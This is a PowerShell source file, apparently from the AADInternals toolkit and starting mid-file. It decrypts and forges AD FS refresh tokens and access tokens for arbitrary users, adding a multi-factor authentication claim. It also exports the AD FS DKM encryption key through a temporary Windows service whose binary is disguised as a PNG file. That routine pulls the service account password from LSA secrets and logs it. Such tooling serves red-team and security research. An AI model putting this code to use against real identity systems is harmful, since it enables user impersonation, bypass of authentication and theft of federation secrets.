        }
    }
}

"@
        Add-Type -TypeDefinition $WCFClassDefinition -ReferencedAssemblies "System.ServiceModel","System.Runtime.Serialization"
        Remove-Variable "WCFClassDefinition"
    }
    Process
    {
        # Form the url 
        $adfsUrl = "http://$Server/adfs/services/policystoretransfer"

        # Create the binding object and set the maximum message size & string lenght to same AD FS is using
        [System.ServiceModel.WSHttpBinding]$binding = [System.ServiceModel.WSHttpBinding]::new()
        $binding.MaxReceivedMessageSize =              20971520
        $binding.ReaderQuotas.MaxStringContentLength = 20971520

        # Instantiate the client and get ServiceSettings
        [AADInternals.PolicyStoreReadOnlyTransferClient]$client = [AADInternals.PolicyStoreReadOnlyTransferClient]::new($binding,[System.ServiceModel.EndpointAddress]::new($adfsUrl))
        $result = $client.getState("ServiceSettings")
        $client.Close()

        # Loop through the results and return the settings
        foreach($property in $result.PropertySets[0])
        {
            if($property.Name -eq "ServiceSettingsData")
            {
                return $property.Values[0]
            }
        }
    }
}

# Decrypt ADFS RefreshToken
# Oct 28th 2021
function Unprotect-ADFSRefreshToken
{
<#
    .SYNOPSIS
    Decrypts and verifies the given AD FS generated Refresh Token with the given certificates.

    .DESCRIPTION
    Decrypts and verifies the given AD FS generated Refresh Token with the given certificates.

    .PARAMETER RefreshToken

    AD FS generated RefreshToken.

    .PARAMETER PfxFileName_encryption

    Name of the PFX file of token encryption certificate.

    .PARAMETER PfxPassword_encryption

    Password of the token encryption PFX file. Optional.

    .PARAMETER PfxFileName_signing

    Name of the PFX file of token signing certificate. Optional. If not provided, refresh token is not verified.

    .PARAMETER PfxPassword_signing

    Password of the token signing PFX file. Optional.
    
    .Example
    PS C:\>Unprotect-ADFSRefreshToken -RefreshToken $token -PfxFileName_encryption .\ADFS_encryption.pfx -PfxFileName_signing .\ADFS_signing.pfx

    ClientID           : 5846ec9c-1cd7-4040-8630-6ae82d6cdfd3
    RedirectUri        : 
    Resource           : urn:microsoft:userinfo
    Issuer             : http://sts.company.com/adfs/services/trust
    NotBefore          : 1635414030
    ExpiresOn          : 1635442830
    SingleSignOnToken  : {"TokenType":0,"StringToken":"vVV[redacted]W/gE=","Version":1}
    DeviceFlowDeviceId : 
    IsDeviceFlow       : False
    SessionKeyString   : 
    SSOToken           : <SessionToken>[redacted]</SessionToken>
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True,ValueFromPipeLine)]
        [String]$RefreshToken,
        
        [Parameter(Mandatory=$True)]
        [string]$PfxFileName_encryption,
        [Parameter(Mandatory=$False)]
        [string]$PfxPassword_encryption,

        [Parameter(Mandatory=$False)]
        [string]$PfxFileName_signing,
        [Parameter(Mandatory=$False)]
        [string]$PfxPassword_signing
    )
    Begin
    {
        $certificate_encryption = Load-Certificate -FileName $PfxFileName_encryption -Password $PfxPassword_encryption -Exportable
        [System.Security.Cryptography.RSACryptoServiceProvider]$privateKey_encryption = Load-PrivateKey -Certificate $certificate_encryption

        if($PfxFileName_signing)
        {
            $certificate_signing = Load-Certificate -FileName $PfxFileName_signing -Password $PfxPassword_signing -Exportable
        }
    }
    Process
    {

        # Separate token and signature
        $tokenParts        = $RefreshToken.Split(".")
        $enc_refresh_token = (Convert-B64ToByteArray -B64 $tokenParts[0])
        $signature         = (Convert-B64ToByteArray -B64 $tokenParts[1])

        # Verify the signature if the signing certificate provided
        if($certificate_signing)
        {
            $valid = $certificate_signing.PublicKey.Key.VerifyData($enc_refresh_token,"SHA256",$signature)
        
            if(!$valid)
            {
                Write-Warning "Invalid signature or signing certificate!"
            }

            Write-Verbose "Refresh token signature validated."
        }

        # Get the refresh token components
        $p = 0
        $hash           = $enc_refresh_token[$p..($p+32-1)] ; $p+=32
        $enc_Key_IV_len = [bitconverter]::ToUInt32($enc_refresh_token[$p..($p+3)],0); $p+=4
        $enc_Key_IV     = $enc_refresh_token[($p)..($p + $enc_Key_IV_len -1)]; $p+= $enc_Key_IV_len
        $enc_token_len  = [bitconverter]::ToUInt32($enc_refresh_token[$p..($p+3)],0); $p+=4
        $enc_token      = $enc_refresh_token[($p)..($p + $enc_token_len -1)]

        # Compare the hash
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $comp_hash = $sha256.ComputeHash([text.encoding]::UTF8.GetBytes($privateKey_encryption.ToXmlString($false)))

        if(Compare-Object -ReferenceObject $hash -DifferenceObject $comp_hash -SyncWindow 0)
        {
            Write-Error "Invalid decryption certificate (hash doesn't match)."
            return
        }
        Write-Verbose "Decryption key hash validated."
        
        # Decrypt Key and IV
        $dec_Key_IV = $privateKey_encryption.Decrypt($enc_Key_IV, $True)
        $dec_Key    = $dec_Key_IV[ 0..31]
        $dec_IV     = $dec_Key_IV[32..48]

        # Decrypt the refresh token
        $Crypto         = [System.Security.Cryptography.RijndaelManaged]::Create()
        $Crypto.Mode    = "CBC"
        $Crypto.Padding = "PKCS7"
        $Crypto.Key     = $dec_Key
        $Crypto.IV      = $dec_IV

        $decryptor = $Crypto.CreateDecryptor()

        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($enc_token,0,$enc_token.Count)
        $cs.Close()
        $cs.Dispose()

        $dec_refresh_token = [text.encoding]::UTF8.GetString($ms.ToArray())
        $ms.Close()
        $ms.Dispose()
        
        # Convert from json
        $refresh_token = $dec_refresh_token | ConvertFrom-Json
        
        # Get the deflated SSOToken
        [byte[]]$def_SSOToken = Convert-B64ToByteArray(($refresh_token.SingleSignOnToken | ConvertFrom-Json).StringToken)

        # Get the binary xml SSOToken
        $bxml_SSOToken = Get-DeDeflatedByteArray -byteArray $def_SSOToken
        
        # Get the xml SSOTOken
        $xml_SSOToken = BinaryToXml -xml_bytes $bxml_SSOToken -Dictionary (Get-XmlDictionary -type Session)
        
        # Set the SSOToken and return
        $refresh_token | Add-Member -NotePropertyName "SSOToken" -NotePropertyValue $xml_SSOToken.outerxml 
        
        $refresh_token
    }
    End
    {
        Unload-PrivateKey -PrivateKey $privateKey_encryption
    }

}


# Create a new ADFS RefreshToken
# Oct 28th 2021
function New-ADFSRefreshToken
{
<#
    .SYNOPSIS
    Creates a new AD FS Refresh Token with the given certificate.

    .DESCRIPTION
    Creates a new AD FS Refresh Token with the given certificate.

    .PARAMETER NotBefore
    The time after the refresh token is valid. Defaults to current time.

    .PARAMETER ExpiresOn
    The time when the refresh token is invalidated. Defaults to 8 hours from the current time.

    .PARAMETER UserPrincipalName
    UserPrincipalName of the user.

    .PARAMETER Name
    DisplayName of the user. Optional.

    .PARAMETER ClientID
    GUID of the client id. The client MUST be configured in the target AD FS server.

    .PARAMETER Resource
    The resource (uri) of the refresh token.

    .PARAMETER Issuer
    The uri of the issuing party

    .PARAMETER RedirectUri
    The redirect uri. Optional.
        
    .PARAMETER PfxFileName_encryption
     Name of the PFX file of token encryption certificate.

    .PARAMETER PfxPassword_encryption
    Password of the token encryption PFX file. Optional.

    .PARAMETER PfxFileName_signing
    Name of the PFX file of token signing certificate.

    .PARAMETER PfxPassword_signing
    Password of the token signing PFX file. Optional.
    
    .Example
    $refresh_token = New-AADIntADFSRefreshToken -UserPrincipalName "user@company.com" -Resource "urn:microsoft:userinfo" -Issuer "http://sts.company.com/adfs/services/trust" -PfxFileName_encryption .\ADFS_encryption.pfx -PfxFileName_signing .\ADFS_signing.pfx -ClientID "5846ec9c-1cd7-4040-8630-6ae82d6cdfd3"

    $body=@{
             "client_id"     = "5846ec9c-1cd7-4040-8630-6ae82d6cdfd3"
             "refresh_token" = $refresh_token
             "grant_type"    = "refresh_token"
           }

    $response = Invoke-RestMethod -UseBasicParsing -Uri "https://sts.company.com/adfs/services/trust/adfs/oauth2/token" -Method Post -Body $body
    $access_token = $response.access_token
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [DateTime]$NotBefore = (Get-Date),
        [Parameter(Mandatory=$False)]
        [DateTime]$ExpiresOn = ((Get-Date).AddHours(8)),

        [Parameter(Mandatory=$True)]
        [String]$UserPrincipalName,

        [Parameter(Mandatory=$False)]
        [String]$Name,

        [Parameter(Mandatory=$True)]
        [guid]$ClientID,

        [Parameter(Mandatory=$True)]
        [String]$Resource,

        [Parameter(Mandatory=$True)]
        [String]$Issuer,

        [Parameter(Mandatory=$False)]
        [String]$RedirectUri,
        
        [Parameter(Mandatory=$True)]
        [String]$PfxFileName_encryption,
        [Parameter(Mandatory=$False)]
        [String]$PfxPassword_encryption,

        [Parameter(Mandatory=$True)]
        [String]$PfxFileName_signing,
        [Parameter(Mandatory=$False)]
        [String]$PfxPassword_signing
    )
    Begin
    {
        $certificate_encryption = Load-Certificate -FileName $PfxFileName_encryption -Password $PfxPassword_encryption
        $certificate_signing    = Load-Certificate -FileName $PfxFileName_signing    -Password $PfxPassword_signing -Exportable
        $privateKey_signing     = Load-PrivateKey  -Certificate $certificate_signing
    }
    Process
    {
        # Generate Session Token
        $Key = Get-RandomBytes -Bytes 16
        [xml]$xml_SessionToken =@"
<SessionToken>
	<Version>1</Version>
	<SecureConversationVersion>http://docs.oasis-open.org/ws-sx/ws-secureconversation/200512</SecureConversationVersion>
	<Id>_$((New-Guid).ToString())-$(Convert-ByteArrayToHex -Bytes (Get-RandomBytes -Bytes 16))</Id>
	<ContextId>urn:uuid:$((New-Guid).ToString())</ContextId>
	<Key>$(Convert-ByteArrayToB64 -Bytes $Key)</Key>
	<KeyGeneration>urn:uuid:$((New-Guid).ToString())</KeyGeneration>
	<EffectiveTime>$($NotBefore.Ticks)</EffectiveTime>
	<ExpiryTime>$($ExpiresOn.Ticks)</ExpiryTime>
	<KeyEffectiveTime>$($NotBefore.Ticks)</KeyEffectiveTime>
	<KeyExpiryTime>$($ExpiresOn.Ticks)</KeyExpiryTime>
	<ClaimsPrincipal>
		<Identities>
			<Identity NameClaimType="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name" RoleClaimType="http://schemas.microsoft.com/ws/2008/06/identity/claims/role">
				<ClaimCollection>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2014/01/identity/claims/anchorclaimtype"       Value="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"                              ValueType="http://www.w3.org/2001/XMLSchema#string"/>
					<Claim Issuer="AD AUTHORITY"    OriginalIssuer="AD AUTHORITY"    Type="http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationinstant" Value="$($NotBefore.ToUniversalTime().ToString("s", [cultureinfo]::InvariantCulture)+".000Z")" ValueType="http://www.w3.org/2001/XMLSchema#dateTime"/>
					<Claim Issuer="LOCAL AUTHORITY" OriginalIssuer="LOCAL AUTHORITY" Type="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"                     Value="$UserPrincipalName"                                                                     ValueType="http://www.w3.org/2001/XMLSchema#string"/>
                    <Claim Issuer="LOCAL AUTHORITY" OriginalIssuer="LOCAL AUTHORITY" Type="http://schemas.microsoft.com/claims/authnmethodsreferences"                    Value="http://schemas.microsoft.com/claims/multipleauthn"                                      ValueType="http://www.w3.org/2001/XMLSchema#string"/>
				</ClaimCollection>
			</Identity>
		</Identities>
	</ClaimsPrincipal>
	<EndpointId/>
</SessionToken>
"@

        $sessionToken = Get-DeflatedByteArray -byteArray (XmlToBinary -xml_doc $xml_SessionToken -Dictionary (Get-XmlDictionary -Type Session))

        # Construct the refresh token
        $refresh_token = [ordered]@{
            "ClientID"          = $ClientID.ToString()
            "RedirectUri"       = $RedirectUri
            "Resource"          = $Resource
            "Issuer"            = $Issuer
            "NotBefore"         = [int]($NotBefore-$epoch).TotalSeconds
            "ExpiresOn"         = [int]($ExpiresOn-$epoch).TotalSeconds
            "SingleSignOnToken" = @{
                                        "TokenType"   = 0
                                        "StringToken" = Convert-ByteArrayToB64 -Bytes $sessionToken
                                        "Version"     = 1
                                  } | ConvertTo-Json -Compress

            "DeviceFlowDeviceId" = $null
            "IsDeviceFlow"       = $false
            "SessionKeyString"   = $null
        } | ConvertTo-Json -Compress

        $dec_token = [text.encoding]::UTF8.GetBytes($refresh_token)

        # Create IV and key
        $dec_IV  = Get-RandomBytes -Bytes 16
        $dec_Key = Get-RandomBytes -Bytes 32

        # Encrypt the refresh token
        $Crypto         = [System.Security.Cryptography.RijndaelManaged]::Create()
        $Crypto.Mode    = "CBC"
        $Crypto.Padding = "PKCS7"
        $Crypto.Key     = $dec_Key
        $Crypto.IV      = $dec_IV

        $decryptor = $Crypto.CreateEncryptor()

        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($dec_token,0,$dec_token.Count)
        $cs.Close()
        $cs.Dispose()

        $enc_token = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()

        # Encrypt Key Iv block
        $enc_Key_IV = New-Object Byte[] 48
        [Array]::Copy($dec_Key,$enc_Key_IV,32)
        [Array]::Copy($dec_IV,0,$enc_Key_IV,32,16)
        $dec_Key_IV=$certificate_encryption.PublicKey.Key.Encrypt($enc_Key_IV, $True)

        # Get the encryption key hash
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $hash   = $sha256.ComputeHash([text.encoding]::UTF8.GetBytes($certificate_encryption.PublicKey.Key.ToXmlString($false)))

        # Create the block
        $buffer = New-Object System.IO.MemoryStream
        $buffer.Write($hash,0,$hash.Length)
        $buffer.Write([bitconverter]::GetBytes([uint32]$dec_Key_IV.Length),0,4)
        $buffer.Write($dec_Key_IV,0,$dec_Key_IV.Length)
        $buffer.Write([bitconverter]::GetBytes([uint32]$enc_token.Length),0,4)
        $buffer.Write($enc_token,0,$enc_token.Length)
        $buffer.Flush()
        $enc_refresh_token = $buffer.ToArray()
        $buffer.Dispose()

        # Sign the token
        # Store the public key 
        $cspParameters = [System.Security.Cryptography.CspParameters]::new()
        $cspParameters.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
        $cspParameters.ProviderType = 24
        $cspParameters.KeyContainerName ="AADInternals"
            
        # Get the private key from the certificate
        $publicKey = [System.Security.Cryptography.RSACryptoServiceProvider]::new(2048,$cspParameters)
        $publicKey.ImportParameters($certificate_signing.PublicKey.Key.ExportParameters($False))

        $signature = $privateKey_signing.SignData($enc_refresh_token,"SHA256")
        
        # Return
        return "$(Convert-ByteArrayToB64 -Bytes $enc_refresh_token -UrlEncode).$(Convert-ByteArrayToB64 -Bytes $signature -UrlEncode)"
    }
    End
    {
        Unload-PrivateKey -PrivateKey $privateKey_signing
    }

}

# Create a new ADFS Access Token
# Nov 1st 2021
function New-ADFSAccessToken
{
<#
    .SYNOPSIS
    Creates a new AccessToken and signs it with the given certificates.

    .DESCRIPTION
    Creates a new AccessToken and signs it with the given certificates.


#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [DateTime]$NotBefore = (Get-Date),
        [Parameter(Mandatory=$False)]
        [DateTime]$ExpiresOn = ((Get-Date).AddHours(8)),

        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName,

        [Parameter(Mandatory=$False)]
        [String]$Name,

        [Parameter(Mandatory=$True)]
        [guid]$ClientID,

        [Parameter(Mandatory=$True)]
        [String]$Resource,

        [Parameter(Mandatory=$False)]
        [String]$Scope="openid",

        [Parameter(Mandatory=$True)]
        [String]$Issuer,

        [Parameter(Mandatory=$True)]
        [String]$PfxFileName_signing,
        [Parameter(Mandatory=$False)]
        [String]$PfxPassword_signing
    )
    Begin
    {
        $certificate_signing    = Load-Certificate -FileName $PfxFileName_signing    -Password $PfxPassword_signing -Exportable
        $privateKey_signing     = Load-PrivateKey  -Certificate $certificate_signing
    }
    Process
    {
        
        # Construct the refresh token
        $payLoad = [ordered]@{
            "aud"        = $Resource
            "iss"        = $Issuer
            "iat"        = [int]($NotBefore-$epoch).TotalSeconds
            "nbf"        = [int]($NotBefore-$epoch).TotalSeconds
            "exp"        = [int]($ExpiresOn-$epoch).TotalSeconds
            "sub"        = $Name
            "apptype"    = "Public"
            "appid"      = $ClientID
            "authmethod" = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"
            "auth_time"  = "$($NotBefore.ToUniversalTime().ToString("s", [cultureinfo]::InvariantCulture)+".000Z")"
            "ver"        = "1.0"
            "scp"        = $Scope
        } 

        $certHash = Convert-ByteArrayToB64 -bytes $certificate_signing.GetCertHash() -UrlEncode -NoPadding

        $header = [ordered]@{
            "typ" = "JWT"
            "alg" = "RS256"
            "x5t" = $certHash
            "kid" = $certHash
        }

        $jwt = New-JWT -PrivateKey $privateKey_signing -Header $header -Payload $payLoad

        return $jwt

    }
    End
    {
        Unload-PrivateKey -PrivateKey $privateKey_signing
    }

}


# Exports the AD FS DKM key using Windows Service
# Aug 23rd 2022
function Export-ADFSEncryptionKeyUsingService
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$false)]
        [String]$ServiceName="AADInternals", 
        [Parameter(Mandatory=$false)]
        [String]$Description,           
        [Parameter(Mandatory=$true)]
        [xml]$Configuration,
        [Parameter(Mandatory=$true)]
        [String]$ADFSUser
      )
    Begin
    {

    }
    Process
    {
        # Path to service executable. File extension doesn't matter :)
        $servicePath="$PSScriptRoot\AADInternals.png"

        $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        
        if($service)
        {
            Write-Verbose "Service $ServiceName already running, restarting"
            Restart-Service -Name $ServiceName | Out-Null
        }
        else
        {
            try
            {
                # First, create a service "in a normal way"
                Write-Verbose "Creating service $ServiceName"

                if(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\adfssrv" -Name "ServiceAccountManaged" -ErrorAction SilentlyContinue)
                {
                    # ADFSSRV is running using Group Managed Service Account
                    Write-Verbose " Creating service to be run as Local System"
                    $service = New-Service -Name $ServiceName -BinaryPathName $servicePath -Description $Description -ErrorAction Stop     

                    # Change the user to AD FS service account
                    Write-Verbose " Changing user to $ADFSUser"
                    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName" -Name "ObjectName"            -Value $ADFSUser

                    # Set the account to service account managed - (not required)
                    Write-Verbose " Setting ServiceAccoungManaged property"
                    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName" -Name "ServiceAccountManaged" -Value ([System.BitConverter]::GetBytes([int32]1)) 
                }
                else
                {
                    # ADFSSRV is running using "legacy" service account so we need to get password from LSAS
                    Write-Verbose "*** Getting password for $ADFSUser **"
                    $adfsPassword = (Get-LSASecrets -Users "_SC_adfssrv").PasswordTxt
                    Write-Verbose "*** Password fetched for $ADFSUser **`n"
                    $credentials = [pscredential]::new($ADFSUser, ($adfsPassword | ConvertTo-SecureString -AsPlainText -Force))

                    Write-Verbose " Creating service to be run as $ADFSUser with password $adfsPassword"
                    $service = New-Service -Name $ServiceName -BinaryPathName $servicePath -Description $Description -Credential $credentials -ErrorAction Stop         
                }

                # Start the service
                Write-Verbose " Starting service $ServiceName"
                Start-Service -Name $ServiceName | Out-Null
            }
            catch
            {
                Write-Error $_
                return
            }
        }

        # Create an output named piped client to connect to the service
        try 
        {
            Write-Verbose " Creating outbound named pipe AADInternals-out"
            $pipeOut = [System.IO.Pipes.NamedPipeClientStream]::new(".","AADInternals-out")
            $pipeOut.Connect(5000) # Wait 5 seconds

            $sw = $null 
            $sw = [System.IO.StreamWriter]::new($pipeOut)
            $sw.AutoFlush = $true
    
            # Send the configuration to the service
            Write-Verbose " Sending configuration to AADInternals-out"
            $sw.WriteLine($Configuration.OuterXml)
        } 
        catch
        {
            Write-Error "Error send message to service: $_"
            return $null
        } 
        finally 
        {
            if ($sw) 
            {
                $sw.Dispose() 
            }
        }
        if ($pipeOut) 
        {
            $pipeOut.Dispose()
        }
        
        # Create an input named piped client to receive the key from the service
        try 
        {
            # Allow everyone to access the pipe
            $pse = [System.IO.Pipes.PipeSecurity]::new()
            $sid = [System.Security.Principal.SecurityIdentifier]::new([System.Security.Principal.WellKnownSidType]::WorldSid, $null)
            $par = [System.IO.Pipes.PipeAccessRule]::new($sid, [System.IO.Pipes.PipeAccessRights]::ReadWrite, [System.Security.AccessControl.AccessControlType]::Allow)
            $pse.AddAccessRule($par)

            Write-Verbose " Creating inbound named pipe AADInternals-in"
            $pipeIn = [System.IO.Pipes.NamedPipeServerStream]::new("AADInternals-in",[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Message, [System.IO.Pipes.PipeOptions]::None,4096,4096,$pse)
            $pipeIn.WaitForConnection()

            Write-Verbose " Reading response from AADInternals-in"
            $sr = [System.IO.StreamReader]::new($pipeIn)
            $message = $sr.Readline()
        } 
        catch 
        {
            Write-Error "Error receiving message from service: $_"
            return $null
        } 
        finally 
        {
            if ($sr) 
            {
                $sr.Dispose() 
            }
            if ($pipeIn) 
            {
                $pipeIn.Dispose()
            }
        }

        Write-Debug " Message: $message"
        return $message 
    }
    End
    {
        # Stop and delete the service
        Write-Verbose " Stopping service $ServiceName"
        Stop-Service $ServiceName -ErrorAction SilentlyContinue | Out-Null
        Write-Verbose " Deleting service $ServiceName"
        SC.exe DELETE $ServiceName | Out-Null
    }
}